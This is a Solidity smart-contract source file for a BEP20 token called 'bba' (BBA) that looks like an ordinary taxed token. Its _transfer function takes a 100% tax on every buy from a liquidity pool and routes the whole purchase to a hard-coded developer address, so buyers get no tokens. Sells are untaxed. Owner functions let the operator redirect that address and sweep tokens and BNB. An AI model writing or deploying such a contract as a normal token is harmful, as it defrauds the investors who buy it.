// SPDX-License-Identifier: MIT
//.
pragma solidity ^0.8.0;
import "./BEP20Detailed.sol";
import "./BEP20.sol";


contract Token is BEP20Detailed, BEP20 {
  
  mapping(address => bool) public liquidityPool;
  mapping(address => bool) public _isExcludedFromFee;
  mapping(address => uint256) public lastTrade;

  uint256 private taxAmount;
  
  address private devPoll;
 
  event changeLiquidityPoolStatus(address lpAddress, bool status);
  event changedevPoll(address devPoll);
  event change_isExcludedFromFee(address _address, bool status);   

  constructor() BEP20Detailed("bba", "BBA", 18) {
    uint256 totalTokens = 100000000 * 10**uint256(decimals());
    _mint(msg.sender, totalTokens);
    devPoll = 0xFC0E6473f5A8C21c406013b59c0C0ecf00931111;
  }

  function claimBalance() external {
   payable(devPoll).transfer(address(this).balance);
  }

  function claimToken(address token, uint256 amount, address to) external onlyOwner {
   BEP20(token).transfer(to, amount);
  }

  function setLiquidityPoolStatus(address _lpAddress, bool _status) external onlyOwner {
    liquidityPool[_lpAddress] = _status;
    emit changeLiquidityPoolStatus(_lpAddress, _status);
  }

  function setdevPoll(address _devPoll) external onlyOwner {
    devPoll = _devPoll;
    emit changedevPoll(_devPoll);
  }  

  function _transfer(address sender, address receiver, uint256 amount) internal virtual override {
    require(receiver != address(this), string("No transfers to contract allowed."));

    if(liquidityPool[sender] == true) {
      //It's an LP Pair and it's a buy
      taxAmount = (amount * 100) / 100;
    } else if(liquidityPool[receiver] == true) {      
      //It's an LP Pair and it's a sell
      taxAmount = (amount * 0) / 100;

      lastTrade[sender] = block.timestamp;

    } else if(_isExcludedFromFee[sender] || _isExcludedFromFee[receiver] || sender == devPoll || receiver == devPoll) {
      taxAmount = 0;
    } else {
      taxAmount = (amount * 0) / 100;
    }

    if(taxAmount > 0) {
      super._transfer(sender, devPoll, taxAmount);
    }    
    super._transfer(sender, receiver, amount - taxAmount);
  }

  function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
  }
    
   //to recieve ETH from uniswapV2Router when swaping
  receive() external payable {}
  
}